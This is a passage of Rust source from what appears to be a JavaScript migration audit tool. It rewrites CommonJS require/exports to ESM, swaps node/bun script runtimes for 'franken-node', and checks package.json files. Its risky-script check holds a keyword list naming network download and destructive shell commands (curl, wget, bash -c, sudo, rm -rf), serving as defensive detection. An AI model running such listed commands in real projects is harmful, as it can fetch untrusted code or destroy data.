    }
    let Some(arguments) = node.child_by_field_name("arguments") else {
        return false;
    };
    let mut cursor = arguments.walk();
    let mut children = arguments.named_children(&mut cursor);
    let Some(argument) = children.next() else {
        return false;
    };
    if children.next().is_some() {
        return false;
    }
    is_quoted_js_string_node(argument, source)
}

fn is_quoted_js_string_node(node: Node<'_>, source: &[u8]) -> bool {
    if node.kind() != "string" {
        return false;
    }
    js_node_text(node, source).is_some_and(|text| {
        (text.starts_with('"') && text.ends_with('"'))
            || (text.starts_with('\'') && text.ends_with('\''))
    })
}

fn is_commonjs_export_target(node: Node<'_>, source: &[u8]) -> bool {
    js_node_text(node, source).is_some_and(|text| {
        text == "module.exports"
            || text.starts_with("module.exports.")
            || text.starts_with("module.exports[")
            || text.starts_with("module[")
            || text == "exports"
            || text.starts_with("exports.")
            || text.starts_with("exports[")
    })
}

fn is_static_module_exports_member(node: Node<'_>, source: &[u8]) -> bool {
    if node.kind() != "member_expression" {
        return false;
    }
    let Some(object) = node.child_by_field_name("object") else {
        return false;
    };
    let Some(property) = node.child_by_field_name("property") else {
        return false;
    };
    js_node_text_eq(object, source, "module") && js_node_text_eq(property, source, "exports")
}

fn is_simple_assignment_operator(left: Node<'_>, right: Node<'_>, source: &[u8]) -> bool {
    let Some(operator_source) = source.get(left.end_byte()..right.start_byte()) else {
        return false;
    };
    std::str::from_utf8(operator_source)
        .ok()
        .is_some_and(|operator| operator.trim() == "=")
}

fn is_rewritable_commonjs_export_object(node: Node<'_>, source: &[u8]) -> bool {
    let mut cursor = node.walk();
    let mut has_export = false;
    for child in node.named_children(&mut cursor) {
        match child.kind() {
            "shorthand_property_identifier" => {
                let Some(identifier) = js_node_text(child, source) else {
                    return false;
                };
                if !is_simple_js_identifier(identifier) {
                    return false;
                }
                has_export = true;
            }
            "pair" => {
                if !is_rewritable_commonjs_export_pair(child, source) {
                    return false;
                }
                has_export = true;
            }
            _ => return false,
        }
    }
    has_export
}

fn is_rewritable_commonjs_export_pair(node: Node<'_>, source: &[u8]) -> bool {
    let Some(key) = node.child_by_field_name("key") else {
        return false;
    };
    let Some(value) = node.child_by_field_name("value") else {
        return false;
    };
    if key.kind() != "property_identifier" || value.kind() != "identifier" {
        return false;
    }
    let Some(key_text) = js_node_text(key, source) else {
        return false;
    };
    let Some(value_text) = js_node_text(value, source) else {
        return false;
    };
    is_simple_js_identifier(key_text) && is_simple_js_identifier(value_text)
}

fn js_node_text<'source>(node: Node<'_>, source: &'source [u8]) -> Option<&'source str> {
    node.utf8_text(source).ok()
}

fn js_node_text_eq(node: Node<'_>, source: &[u8], expected: &str) -> bool {
    js_node_text(node, source).is_some_and(|text| text == expected)
}

fn prepend_hoisted_imports(output: &mut String, body: &str, imports: &[String]) {
    if imports.is_empty() {
        output.push_str(body);
        return;
    }
    let mut rest = body;
    if let Some(first_line) = body.split_inclusive('\n').next() {
        if first_line.starts_with("#!") {
            output.push_str(first_line);
            rest = &body[first_line.len()..];
        }
    }
    for import in imports {
        output.push_str(import);
        output.push('\n');
    }
    output.push_str(rest);
}

fn split_line_ending(line: &str) -> (&str, &str) {
    if let Some(body) = line.strip_suffix("\r\n") {
        return (body, "\r\n");
    }
    if let Some(body) = line.strip_suffix('\n') {
        return (body, "\n");
    }
    (line, "")
}

fn line_has_esm_module_syntax(line: &str) -> bool {
    let trimmed = line.trim_start();
    if is_ignorable_js_line(trimmed) {
        return false;
    }
    trimmed.starts_with("import ")
        || trimmed.starts_with("import{")
        || trimmed.starts_with("import*")
        || trimmed.starts_with("export ")
        || trimmed.starts_with("export{")
}

fn line_has_commonjs_export(line: &str) -> bool {
    let trimmed = line.trim_start();
    if is_ignorable_js_line(trimmed) {
        return false;
    }
    trimmed.starts_with("module.exports")
        || trimmed.starts_with("exports.")
        || trimmed.starts_with("exports[")
        || trimmed.starts_with("exports =")
}

fn line_contains_require_call(line: &str) -> bool {
    let trimmed = line.trim_start();
    !is_ignorable_js_line(trimmed) && contains_js_call_outside_literals(line, "require")
}

fn is_ignorable_js_line(trimmed_line: &str) -> bool {
    trimmed_line.starts_with("//")
        || trimmed_line.starts_with("/*")
        || trimmed_line.starts_with('*')
}

fn rewrite_commonjs_line(line: &str) -> Option<CommonJsLineRewrite> {
    if let Some(import_line) = rewrite_commonjs_require_line(line) {
        return Some(CommonJsLineRewrite {
            replacement_line: None,
            hoisted_import: Some(import_line),
        });
    }
    rewrite_commonjs_export_line(line).map(|replacement_line| CommonJsLineRewrite {
        replacement_line: Some(replacement_line),
        hoisted_import: None,
    })
}

fn rewrite_commonjs_require_line(line: &str) -> Option<String> {
    let (code, suffix_comment) = split_js_trailing_line_comment(line);
    let trimmed_code = code.trim();
    let declaration = trimmed_code
        .strip_prefix("const ")
        .or_else(|| trimmed_code.strip_prefix("let "))
        .or_else(|| trimmed_code.strip_prefix("var "))?;
    let (binding, initializer) = declaration.split_once('=')?;
    let binding = binding.trim();
    let (specifier, after_call) = parse_static_require_call(initializer.trim())?;
    if !after_call.is_empty() && after_call != ";" {
        return None;
    }

    let normalized_specifier = normalize_import_specifier(&specifier);
    let import_line = if let Some(named_bindings) = parse_commonjs_object_binding(binding) {
        format!(
            "import {{ {} }} from \"{normalized_specifier}\";",
            named_bindings.join(", ")
        )
    } else if is_simple_js_identifier(binding) {
        format!("import {binding} from \"{normalized_specifier}\";")
    } else {
        return None;
    };
    Some(append_js_suffix_comment(import_line, suffix_comment))
}

fn parse_static_require_call(initializer: &str) -> Option<(String, &str)> {
    let after_name = initializer.strip_prefix("require")?.trim_start();
    let after_open = after_name.strip_prefix('(')?.trim_start();
    let mut chars = after_open.char_indices();
    let (_, quote) = chars.next()?;
    if quote != '"' && quote != '\'' {
        return None;
    }
    let specifier_start = quote.len_utf8();
    let mut specifier_end = None;
    let mut escaped = false;
    for (index, ch) in after_open[specifier_start..].char_indices() {
        if escaped {
            return None;
        }
        if ch == '\\' {
            escaped = true;
            continue;
        }
        if ch == quote {
            specifier_end = Some(specifier_start + index);
            break;
        }
    }
    let specifier_end = specifier_end?;
    let specifier = &after_open[specifier_start..specifier_end];
    if specifier.trim().is_empty() || specifier.contains('"') || specifier.contains('\'') {
        return None;
    }
    let after_specifier = &after_open[specifier_end + quote.len_utf8()..];
    let after_call = after_specifier.trim_start().strip_prefix(')')?.trim();
    Some((specifier.to_string(), after_call))
}

fn parse_commonjs_object_binding(binding: &str) -> Option<Vec<String>> {
    let inner = binding.trim().strip_prefix('{')?.strip_suffix('}')?;
    let mut named_bindings = Vec::new();
    for member in split_js_top_level_commas(inner) {
        let member = member.trim();
        if member.is_empty()
            || member.starts_with("...")
            || member.contains('=')
            || member.contains('{')
            || member.contains('[')
        {
            return None;
        }
        let import_binding = if let Some((imported, local)) = member.split_once(':') {
            let imported = imported.trim();
            let local = local.trim();
            if !is_simple_js_identifier(imported) || !is_simple_js_identifier(local) {
                return None;
            }
            if imported == local {
                imported.to_string()
            } else {
                format!("{imported} as {local}")
            }
        } else {
            if !is_simple_js_identifier(member) {
                return None;
            }
            member.to_string()
        };
        push_bounded(&mut named_bindings, import_binding, MAX_TOTAL_FINDINGS);
    }
    if named_bindings.is_empty() {
        return None;
    }
    Some(named_bindings)
}

fn rewrite_commonjs_export_line(line: &str) -> Option<String> {
    if line.chars().next().is_some_and(|ch| ch.is_whitespace()) {
        return None;
    }
    let (code, suffix_comment) = split_js_trailing_line_comment(line);
    let rhs = code
        .trim()
        .strip_prefix("module.exports")?
        .trim_start()
        .strip_prefix('=')?
        .trim();
    let rhs = rhs.strip_suffix(';').unwrap_or(rhs).trim();
    let exports = parse_commonjs_export_object(rhs)?;
    let export_line = format!("export {{ {} }};", exports.join(", "));
    Some(append_js_suffix_comment(export_line, suffix_comment))
}

fn parse_commonjs_export_object(rhs: &str) -> Option<Vec<String>> {
    let inner = rhs.strip_prefix('{')?.strip_suffix('}')?;
    let mut exports = Vec::new();
    for member in split_js_top_level_commas(inner) {
        let member = member.trim();
        if member.is_empty()
            || member.starts_with("...")
            || member.contains('(')
            || member.contains('{')
            || member.contains('[')
        {
            return None;
        }
        let export_binding = if let Some((exported, local)) = member.split_once(':') {
            let exported = exported.trim();
            let local = local.trim();
            if !is_simple_js_identifier(exported) || !is_simple_js_identifier(local) {
                return None;
            }
            if exported == local {
                local.to_string()
            } else {
                format!("{local} as {exported}")
            }
        } else {
            if !is_simple_js_identifier(member) {
                return None;
            }
            member.to_string()
        };
        push_bounded(&mut exports, export_binding, MAX_TOTAL_FINDINGS);
    }
    if exports.is_empty() {
        return None;
    }
    Some(exports)
}

fn split_js_top_level_commas(input: &str) -> Vec<&str> {
    let mut parts = Vec::new();
    let mut start = 0_usize;
    let mut quote = None;
    let mut escaped = false;
    for (index, ch) in input.char_indices() {
        if let Some(active_quote) = quote {
            if escaped {
                escaped = false;
            } else if ch == '\\' {
                escaped = true;
            } else if ch == active_quote {
                quote = None;
            }
            continue;
        }
        if ch == '"' || ch == '\'' || ch == '`' {
            quote = Some(ch);
        } else if ch == ',' {
            parts.push(&input[start..index]);
            start = index + ch.len_utf8();
        }
    }
    parts.push(&input[start..]);
    parts
}

fn split_js_trailing_line_comment(line: &str) -> (&str, &str) {
    let mut quote = None;
    let mut escaped = false;
    for (index, ch) in line.char_indices() {
        if let Some(active_quote) = quote {
            if escaped {
                escaped = false;
            } else if ch == '\\' {
                escaped = true;
            } else if ch == active_quote {
                quote = None;
            }
            continue;
        }
        if ch == '"' || ch == '\'' || ch == '`' {
            quote = Some(ch);
            continue;
        }
        if ch == '/' && line[index + ch.len_utf8()..].starts_with('/') {
            return (line[..index].trim_end(), &line[index..]);
        }
    }
    (line, "")
}

fn append_js_suffix_comment(mut line: String, suffix_comment: &str) -> String {
    let suffix_comment = suffix_comment.trim_start();
    if !suffix_comment.is_empty() {
        line.push(' ');
        line.push_str(suffix_comment);
    }
    line
}

fn contains_js_call_outside_literals(line: &str, function_name: &str) -> bool {
    let mut quote = None;
    let mut escaped = false;
    for (index, ch) in line.char_indices() {
        if let Some(active_quote) = quote {
            if escaped {
                escaped = false;
            } else if ch == '\\' {
                escaped = true;
            } else if ch == active_quote {
                quote = None;
            }
            continue;
        }
        if ch == '"' || ch == '\'' || ch == '`' {
            quote = Some(ch);
            continue;
        }
        if ch == '/' && line[index + ch.len_utf8()..].starts_with('/') {
            return false;
        }
        let rest = &line[index..];
        if rest.starts_with(function_name) {
            let before = line[..index].chars().next_back();
            let after_name = &rest[function_name.len()..];
            let after = after_name.chars().next();
            if before.is_none_or(|candidate| !is_js_identifier_continue(candidate))
                && after.is_some_and(|candidate| candidate == '(' || candidate.is_whitespace())
                && after_name.trim_start().starts_with('(')
            {
                return true;
            }
        }
    }
    false
}

fn is_js_identifier_continue(ch: char) -> bool {
    ch == '_' || ch == '$' || ch.is_ascii_alphanumeric()
}

fn is_simple_js_identifier(candidate: &str) -> bool {
    let mut chars = candidate.chars();
    let Some(first) = chars.next() else {
        return false;
    };
    if !(first == '_' || first == '$' || first.is_ascii_alphabetic()) {
        return false;
    }
    chars.all(|ch| ch == '_' || ch == '$' || ch.is_ascii_alphanumeric())
}

fn normalize_import_specifier(specifier: &str) -> String {
    if specifier.starts_with("node:") {
        return specifier.to_string();
    }
    if is_node_builtin_specifier(specifier) {
        return format!("node:{specifier}");
    }
    specifier.to_string()
}

fn is_node_builtin_specifier(specifier: &str) -> bool {
    let base = specifier.split('/').next().unwrap_or(specifier);
    matches!(
        base,
        "assert"
            | "async_hooks"
            | "buffer"
            | "child_process"
            | "cluster"
            | "console"
            | "constants"
            | "crypto"
            | "dgram"
            | "diagnostics_channel"
            | "dns"
            | "domain"
            | "events"
            | "fs"
            | "http"
            | "http2"
            | "https"
            | "inspector"
            | "module"
            | "net"
            | "os"
            | "path"
            | "perf_hooks"
            | "process"
            | "punycode"
            | "querystring"
            | "readline"
            | "repl"
            | "stream"
            | "string_decoder"
            | "timers"
            | "tls"
            | "tty"
            | "url"
            | "util"
            | "v8"
            | "vm"
            | "wasi"
            | "worker_threads"
            | "zlib"
    )
}

fn is_lockfile(name: &str) -> bool {
    matches!(
        name,
        "package-lock.json"
            | "npm-shrinkwrap.json"
            | "pnpm-lock.yaml"
            | "yarn.lock"
            | "bun.lockb"
            | "bun.lock"
    )
}

fn inspect_package_manifest(
    manifest_path: &Path,
    relative_path: &str,
    findings: &mut Vec<MigrationAuditFinding>,
    scripts_flagged: &mut usize,
    engine_gaps: &mut usize,
) {
    let raw = match std::fs::read_to_string(manifest_path) {
        Ok(content) => content,
        Err(err) => {
            push_bounded(findings, MigrationAuditFinding {
                id: String::new(),
                category: MigrationCategory::Project,
                severity: MigrationSeverity::Medium,
                message: format!("failed to read package manifest: {err}"),
                path: Some(relative_path.to_string()),
                recommendation: Some(
                    "Ensure package.json is readable so migration audit can classify dependencies."
                        .to_string(),
                ),
            }, MAX_TOTAL_FINDINGS);
            return;
        }
    };

    let parsed: serde_json::Value = match serde_json::from_str(&raw) {
        Ok(value) => value,
        Err(err) => {
            push_bounded(
                findings,
                MigrationAuditFinding {
                    id: String::new(),
                    category: MigrationCategory::Project,
                    severity: MigrationSeverity::High,
                    message: format!("invalid package.json JSON: {err}"),
                    path: Some(relative_path.to_string()),
                    recommendation: Some(
                        "Fix package.json syntax before running migration rewrite/validate."
                            .to_string(),
                    ),
                },
                MAX_TOTAL_FINDINGS,
            );
            return;
        }
    };

    if parsed
        .get("engines")
        .and_then(serde_json::Value::as_object)
        .and_then(|engines| engines.get("node"))
        .is_none()
    {
        *engine_gaps = engine_gaps.saturating_add(1);
        push_capped_script_finding(
            findings,
            ScriptFindingKind::MissingNodeEngine,
            relative_path,
            *engine_gaps,
        );
    }

    if let Some(scripts) = parsed.get("scripts").and_then(serde_json::Value::as_object) {
        for (script_name, command_value) in scripts {
            let Some(command) = command_value.as_str() else {
                continue;
            };
            if is_risky_script(script_name, command) {
                *scripts_flagged = scripts_flagged.saturating_add(1);
                push_capped_script_finding(
                    findings,
                    ScriptFindingKind::Risky,
                    relative_path,
                    *scripts_flagged,
                );
            }
        }
    }
}

fn push_capped_script_finding(
    findings: &mut Vec<MigrationAuditFinding>,
    kind: ScriptFindingKind,
    relative_path: &str,
    count: usize,
) {
    if count > MAX_FINDINGS_PER_CATEGORY {
        return;
    }

    let (category, severity, message, recommendation) = match kind {
        ScriptFindingKind::Risky => (
            MigrationCategory::Scripts,
            MigrationSeverity::High,
            "risky install/build script pattern detected in package.json".to_string(),
            "Replace dynamic install hooks with deterministic build steps before migration."
                .to_string(),
        ),
        ScriptFindingKind::MissingNodeEngine => (
            MigrationCategory::Runtime,
            MigrationSeverity::Low,
            "package.json is missing engines.node version pin".to_string(),
            "Add engines.node to reduce runtime drift during migration verification.".to_string(),
        ),
    };

    push_bounded(
        findings,
        MigrationAuditFinding {
            id: String::new(),
            category,
            severity,
            message,
            path: Some(relative_path.to_string()),
            recommendation: Some(recommendation),
        },
        MAX_TOTAL_FINDINGS,
    );
}

fn is_risky_script(script_name: &str, command: &str) -> bool {
    let script = script_name.to_ascii_lowercase();
    let cmd = command.to_ascii_lowercase();
    let install_hook = matches!(script.as_str(), "preinstall" | "install" | "postinstall");
    let risky_terms = [
        "curl ",
        "wget ",
        "chmod +x",
        "bash -c",
        "powershell ",
        "sudo ",
        "rm -rf",
        "node-gyp",
    ];

    install_hook || risky_terms.iter().any(|term| cmd.contains(term))
}

fn ensure_node_engine_pin(manifest: &mut serde_json::Value) -> bool {
    let Some(root) = manifest.as_object_mut() else {
        return false;
    };
    let engines = root
        .entry("engines".to_string())
        .or_insert_with(|| serde_json::json!({}));

    let Some(engines_obj) = engines.as_object_mut() else {
        return false;
    };

    if engines_obj
        .get("node")
        .and_then(serde_json::Value::as_str)
        .is_some_and(|value| !value.trim().is_empty())
    {
        return false;
    }

    engines_obj.insert("node".to_string(), serde_json::json!(">=20 <23"));
    true
}

fn collect_package_script_rewrites(manifest: &serde_json::Value) -> Vec<PackageScriptRewrite> {
    let mut rewrites = Vec::new();
    let Some(scripts) = manifest
        .get("scripts")
        .and_then(serde_json::Value::as_object)
    else {
        return rewrites;
    };

    for (script_name, command_value) in scripts {
        let Some(command) = command_value.as_str() else {
            continue;
        };
        if let Some(script_rewrite) = classify_package_script_command(script_name, command) {
            push_bounded(&mut rewrites, script_rewrite, MAX_TOTAL_FINDINGS);
        }
    }

    rewrites.sort_by(|left, right| left.script_name.cmp(&right.script_name));
    rewrites
}

fn classify_package_script_command(
    script_name: &str,
    command: &str,
) -> Option<PackageScriptRewrite> {
    let tokens = tokenize_package_script_command(command)?;
    let mut first_match = None;
    let mut replacements = Vec::new();
    let mut segment_start = 0_usize;

    while segment_start < tokens.len() {
        let segment_end = tokens[segment_start..]
            .iter()
            .position(|token| token.kind != PackageScriptShellTokenKind::Word)
            .map_or(tokens.len(), |offset| segment_start.saturating_add(offset));

        if let Some(command_match) =
            classify_package_script_segment(&tokens[segment_start..segment_end])
        {
            first_match.get_or_insert_with(|| command_match.clone());
            if matches!(
                command_match.runtime,
                PackageScriptRuntime::Node | PackageScriptRuntime::Bun
            ) {
                push_bounded(
                    &mut replacements,
                    (command_match.runtime_start, command_match.runtime_end),
                    MAX_FINDINGS_PER_CATEGORY,
                );
            }
        }

        segment_start = segment_end.saturating_add(1);
    }

    let first_match = first_match?;
    let rewritten_command = if replacements.is_empty() {
        None
    } else {
        Some(apply_package_script_runtime_replacements(
            command,
            &replacements,
        ))
    };

    Some(PackageScriptRewrite {
        script_name: script_name.to_string(),
        runtime: first_match.runtime,
        entry_path: first_match.entry_path,
        original_command: command.to_string(),
        rewritten_command,
    })
}

fn tokenize_package_script_command(command: &str) -> Option<Vec<PackageScriptShellToken>> {
    let mut tokens = Vec::new();
    let mut index = 0_usize;

    while index < command.len() {
        let current = command[index..].chars().next()?;
        if current.is_whitespace() {
            index = index.saturating_add(current.len_utf8());
            continue;
        }

        if let Some((kind, width)) = package_script_control_token(command, index) {
            let end = index.saturating_add(width);
            let raw = command.get(index..end)?.to_string();
            push_bounded(
                &mut tokens,
                PackageScriptShellToken {
                    kind,
                    unquoted: raw.clone(),
                    raw,
                    start: index,
                    end,
                },
                MAX_TOTAL_FINDINGS,
            );
            index = end;
            continue;
        }

        let start = index;
        let mut unquoted = String::new();
        let mut quote = None;

        while index < command.len() {
            let ch = command[index..].chars().next()?;
            if quote.is_none()
                && (ch.is_whitespace() || package_script_control_token(command, index).is_some())
            {
                break;
            }

            match quote {
                None => match ch {
                    '\'' | '"' => {
                        quote = Some(ch);
                        index = index.saturating_add(ch.len_utf8());
                    }
                    '\\' => {
                        index = index.saturating_add(ch.len_utf8());
                        if index < command.len() {
                            let escaped = command[index..].chars().next()?;
                            unquoted.push(escaped);
                            index = index.saturating_add(escaped.len_utf8());
                        } else {
                            unquoted.push(ch);
                        }
                    }
                    _ => {
                        unquoted.push(ch);
                        index = index.saturating_add(ch.len_utf8());
                    }
                },
                Some(active_quote) if ch == active_quote => {
                    quote = None;
                    index = index.saturating_add(ch.len_utf8());
                }
                Some('"') if ch == '\\' => {
                    index = index.saturating_add(ch.len_utf8());
                    if index < command.len() {
                        let escaped = command[index..].chars().next()?;
                        unquoted.push(escaped);
                        index = index.saturating_add(escaped.len_utf8());
                    } else {
                        unquoted.push(ch);
                    }
                }
                Some(_) => {
                    unquoted.push(ch);
                    index = index.saturating_add(ch.len_utf8());
                }
            }
        }

        if quote.is_some() || start == index {
            return None;
        }

        let raw = command.get(start..index)?.to_string();
        push_bounded(
            &mut tokens,
            PackageScriptShellToken {
                kind: PackageScriptShellTokenKind::Word,
                raw,
                unquoted,
                start,
                end: index,
            },
            MAX_TOTAL_FINDINGS,
        );
    }

    Some(tokens)
}

fn package_script_control_token(
    command: &str,
    index: usize,
) -> Option<(PackageScriptShellTokenKind, usize)> {
    let rest = command.get(index..)?;
    if rest.starts_with("&&") {
        return Some((PackageScriptShellTokenKind::AndIf, 2));
    }
    if rest.starts_with("||") {
        return Some((PackageScriptShellTokenKind::OrIf, 2));
    }
    if rest.starts_with(';') {
        return Some((PackageScriptShellTokenKind::Sequence, 1));
    }
    if rest.starts_with('|') {
        return Some((PackageScriptShellTokenKind::Pipe, 1));
    }
    None
}

fn classify_package_script_segment(
    tokens: &[PackageScriptShellToken],
) -> Option<PackageScriptCommandMatch> {
    if tokens.is_empty() {
        return None;
    }

    let mut command_index = skip_shell_env_assignments(tokens, 0);

    if tokens
        .get(command_index)
        .is_some_and(|token| token.unquoted == "env")
    {
        command_index = skip_shell_env_assignments(tokens, command_index.saturating_add(1));
    }

    if tokens
        .get(command_index)
        .is_some_and(|token| matches!(token.unquoted.as_str(), "cross-env" | "cross-env-shell"))
    {
        command_index = skip_shell_env_assignments(tokens, command_index.saturating_add(1));
    }

    let runtime_index =
        package_manager_wrapped_runtime_index(tokens, command_index).unwrap_or(command_index);
    let runtime = package_script_runtime_from_word(tokens.get(runtime_index)?.unquoted.as_str())?;
    let entry_index = package_script_entry_index(tokens, runtime_index)?;
    let entry_path = tokens.get(entry_index)?.unquoted.clone();
    if !is_package_script_entry_path(&entry_path) {
        return None;
    }

    let runtime_token = tokens.get(runtime_index)?;
    Some(PackageScriptCommandMatch {
        runtime,
        runtime_start: runtime_token.start,
        runtime_end: runtime_token.end,
        entry_path,
    })
}

fn skip_shell_env_assignments(tokens: &[PackageScriptShellToken], mut index: usize) -> usize {
    while tokens
        .get(index)
        .is_some_and(|token| is_shell_env_assignment(&token.unquoted))
    {
        index = index.saturating_add(1);
    }
    index
}

fn is_shell_env_assignment(word: &str) -> bool {
    let Some((name, _value)) = word.split_once('=') else {
        return false;
    };
    let mut chars = name.chars();
    let Some(first) = chars.next() else {
        return false;
    };
    (first == '_' || first.is_ascii_alphabetic())
        && chars.all(|ch| ch == '_' || ch.is_ascii_alphanumeric())
}

fn package_manager_wrapped_runtime_index(
    tokens: &[PackageScriptShellToken],
    command_index: usize,
) -> Option<usize> {
    let command = tokens.get(command_index)?.unquoted.as_str();
    match command {
        "npm" | "pnpm" => {
            let subcommand = tokens
                .get(command_index.saturating_add(1))?
                .unquoted
                .as_str();
            if !matches!(subcommand, "exec" | "x" | "dlx") {
                return None;
            }
            Some(skip_package_manager_exec_options(
                tokens,
                command_index.saturating_add(2),
            ))
        }
        "npx" => Some(skip_package_manager_exec_options(
            tokens,
            command_index.saturating_add(1),
        )),
        "yarn" => {
            let next_index = command_index.saturating_add(1);
            let next = tokens.get(next_index)?.unquoted.as_str();
            if next == "exec" {
                Some(skip_package_manager_exec_options(
                    tokens,
                    next_index.saturating_add(1),
                ))
            } else if package_script_runtime_from_word(next).is_some() {
                Some(next_index)
            } else {
                None
            }
        }
        _ => None,
    }
}

fn skip_package_manager_exec_options(
    tokens: &[PackageScriptShellToken],
    mut index: usize,
) -> usize {
    loop {
        let Some(token) = tokens.get(index) else {
            return index;
        };
        let word = token.unquoted.as_str();
        if word == "--" {
            return index.saturating_add(1);
        }
        if matches!(word, "--package" | "-p") {
            index = index.saturating_add(2);
            continue;
        }
        if word.starts_with("--package=") || matches!(word, "--yes" | "-y") {
            index = index.saturating_add(1);
            continue;
        }
        break;
    }
    skip_shell_env_assignments(tokens, index)
}

fn package_script_runtime_from_word(word: &str) -> Option<PackageScriptRuntime> {
    match word {
        "node" | "node.exe" => Some(PackageScriptRuntime::Node),
        "bun" | "bun.exe" => Some(PackageScriptRuntime::Bun),
        "franken-node" | "franken-node.exe" => Some(PackageScriptRuntime::FrankenNode),
        _ => None,
    }
}

fn package_script_entry_index(
    tokens: &[PackageScriptShellToken],
    runtime_index: usize,
) -> Option<usize> {
    let mut index = runtime_index.saturating_add(1);
    while let Some(token) = tokens.get(index) {
        let word = token.unquoted.as_str();
        if word == "--" {
            return Some(index.saturating_add(1));
        }
        if package_script_runtime_option_takes_value(word) {
            index = index.saturating_add(2);
            continue;
        }
        if word.starts_with('-') {
            index = index.saturating_add(1);
            continue;
        }
        return Some(index);
    }
    None
}

fn package_script_runtime_option_takes_value(word: &str) -> bool {
    matches!(
        word,
        "-e" | "--eval"
            | "-p"
            | "--print"
            | "-r"
            | "--require"
            | "--loader"
            | "--import"
            | "--env-file"
            | "--conditions"
            | "--inspect-port"
    )
}

fn apply_package_script_runtime_replacements(
    command: &str,
    replacements: &[(usize, usize)],
) -> String {
    let mut rewritten = command.to_string();
    let mut sorted = replacements.to_vec();
    sorted.sort_by(|left, right| right.0.cmp(&left.0));
    for (start, end) in sorted {
        if start <= end && end <= rewritten.len() {
            rewritten.replace_range(start..end, "franken-node");
        }
    }
    rewritten
}

fn apply_package_script_rewrites(
    manifest: &mut serde_json::Value,
    rewrites: &[PackageScriptRewrite],
) -> usize {
    let Some(scripts) = manifest
        .get_mut("scripts")
        .and_then(serde_json::Value::as_object_mut)
    else {
        return 0;
    };

    let mut rewrite_count = 0_usize;
    for script_rewrite in rewrites {
        let Some(rewritten_command) = &script_rewrite.rewritten_command else {
            continue;
        };
        let Some(command_value) = scripts.get_mut(&script_rewrite.script_name) else {
            continue;
        };
        if command_value.as_str() == Some(script_rewrite.original_command.as_str()) {
            *command_value = serde_json::Value::String(rewritten_command.clone());
            rewrite_count = rewrite_count.saturating_add(1);
        }
    }
    rewrite_count
}

/// MVP shell coverage: quoted words, env prefixes, cross-env/env wrappers,
/// npm/pnpm/npx/yarn exec wrappers, and `&&`/`||`/`;`/`|` segments. More
/// complex shell forms such as subshells, heredocs, command substitution, and
/// nested `npm run` indirection remain manual-review territory.
fn is_package_script_entry_path(token: &str) -> bool {
    let token = unquote_script_token(token);
    if token.is_empty()
        || token.starts_with('-')
        || token.contains(';')
        || token.contains('|')
        || token.contains('&')
        || token.contains("$(")
    {
        return false;
    }
    matches!(
        Path::new(token)
            .extension()
            .and_then(std::ffi::OsStr::to_str)
            .map(str::to_ascii_lowercase)
            .as_deref(),
        Some("js" | "mjs" | "cjs")
    )
}

fn unquote_script_token(token: &str) -> &str {
    token
        .strip_prefix('"')
        .and_then(|rest| rest.strip_suffix('"'))
        .or_else(|| {
            token
                .strip_prefix('\'')
                .and_then(|rest| rest.strip_suffix('\''))
        })
        .unwrap_or(token)
}

fn build_module_graph_entry(
    project_path: &Path,
    manifest_path: &Path,
    manifest_relative_path: &str,
    script_rewrite: &PackageScriptRewrite,
) -> Option<MigrationRewriteEntry> {
    let manifest_dir = manifest_path.parent().unwrap_or(project_path);
    let entry_path =
        resolve_script_entry_path(project_path, manifest_dir, &script_rewrite.entry_path)?;
    let graph_files = collect_module_graph_files(project_path, &entry_path);
    if graph_files.is_empty() {
        return None;
    }

    let displayed_files = graph_files
        .iter()
        .take(8)
        .cloned()
        .collect::<Vec<_>>()
        .join(", ");
    let overflow = graph_files.len().saturating_sub(8);
    let overflow_detail = if overflow > 0 {
        format!(" (+{overflow} more)")
    } else {
        String::new()
    };

    Some(MigrationRewriteEntry {
        id: String::new(),
        path: Some(manifest_relative_path.to_string()),
        action: MigrationRewriteAction::ModuleGraphDiscovery,
        detail: format!(
            "script `{}` uses `{}` entry `{}`; module graph discovered {} JS/MJS/CJS file(s): {}{}",
            script_rewrite.script_name,
            script_rewrite.runtime.as_str(),
            script_rewrite.entry_path,
            graph_files.len(),
            displayed_files,
            overflow_detail
        ),
        applied: false,
    })
}

fn resolve_script_entry_path(
    project_path: &Path,
    manifest_dir: &Path,
    entry_path: &str,
) -> Option<PathBuf> {
    let entry = Path::new(entry_path);
    if entry.is_absolute() {
        return None;
    }
    let candidate = manifest_dir.join(entry);
    resolve_existing_graph_file(project_path, &candidate)
}

fn collect_module_graph_files(project_path: &Path, entry_path: &Path) -> Vec<String> {
    let Ok(project_root) = std::fs::canonicalize(project_path) else {
        return Vec::new();
    };
    let Some(entry_path) = resolve_existing_graph_file(&project_root, entry_path) else {
        return Vec::new();
    };

    let mut discovered = BTreeSet::new();
    let mut pending = vec![entry_path];

    while let Some(path) = pending.pop() {
        if discovered.len() >= MAX_PROJECT_FILES {
            break;
        }
        let Some(path) = resolve_existing_graph_file(&project_root, &path) else {
            continue;
        };
        if !discovered.insert(path.clone()) {
            continue;
        }

        let Ok(source) = std::fs::read_to_string(&path) else {
            continue;
        };
        let base_dir = path.parent().unwrap_or(&project_root);
        for specifier in extract_relative_module_specifiers(&source) {
            if let Some(next_path) =
                resolve_relative_module_specifier(&project_root, base_dir, &specifier)
                && !discovered.contains(&next_path)
            {
                push_bounded(&mut pending, next_path, MAX_PENDING_DIRS);
            }
        }
    }

    discovered
        .into_iter()
        .map(|path| relative_display(&project_root, &path))
        .collect()
}

fn resolve_relative_module_specifier(
    project_root: &Path,
    base_dir: &Path,
    specifier: &str,
) -> Option<PathBuf> {
    let specifier = specifier
        .split_once('?')
        .map_or(specifier, |(path, _query)| path)
        .split_once('#')
        .map_or(specifier, |(path, _fragment)| path);
    let candidate = base_dir.join(specifier);
    if is_graph_source_file(&candidate) {
        return resolve_existing_graph_file(project_root, &candidate);
    }

    for candidate in [
        candidate.with_extension("js"),
        candidate.with_extension("mjs"),
        candidate.with_extension("cjs"),
        candidate.join("index.js"),
        candidate.join("index.mjs"),
        candidate.join("index.cjs"),
    ] {
        if let Some(path) = resolve_existing_graph_file(project_root, &candidate) {
            return Some(path);
        }
    }
    None
}

fn resolve_existing_graph_file(project_root: &Path, path: &Path) -> Option<PathBuf> {
    let path = std::fs::canonicalize(path).ok()?;
    if path.starts_with(project_root) && path.is_file() && is_graph_source_file(&path) {
        Some(path)
    } else {
        None
    }
}

fn is_graph_source_file(path: &Path) -> bool {
    path.extension()
        .and_then(std::ffi::OsStr::to_str)
        .is_some_and(|extension| {
            matches!(
                extension.to_ascii_lowercase().as_str(),
                "js" | "mjs" | "cjs"
            )
        })
}

fn extract_relative_module_specifiers(source: &str) -> Vec<String> {
